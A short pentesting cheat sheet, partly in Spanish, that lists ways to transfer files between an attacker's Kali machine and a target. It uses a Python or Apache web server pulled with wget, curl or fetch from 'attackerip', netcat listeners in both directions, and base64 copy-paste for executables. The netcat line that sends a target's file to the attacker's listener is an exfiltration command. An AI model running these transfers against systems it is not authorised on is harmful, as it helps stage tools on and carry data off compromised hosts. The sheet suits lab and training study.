# Servidor simple en python por HTTP

## El atacante
python -m http.server

## El atacado 
wget <attackerip>:8000/filename

-----------------------------------------

Apache

#El atacante
cp filetosend.txt /var/www/html
service apache2 start

#El atacado 
wget http://attackerip/file
curl http://attackerip/file > file
fetch http://attackerip/file        # on BSD

----------------------------------

Netcat (From Target to Kali)

# Escucha con netcat
nc -lvp 4444 > file

# mandar a mi máquina
nc <kali_ip> 4444 < file

-----------------


Netcat (From Kali to Target)

# on target, wait for the file
nc -nvlp 55555 > file

# on kali, push the file
nc $victimip 55555 < file


----------------------

Extra:
To send the executable file to your machine:

base64 executable
# copy the output
# paste it in a file called file.txt
# decode it and create the executable
base64 -d file.txt > executable
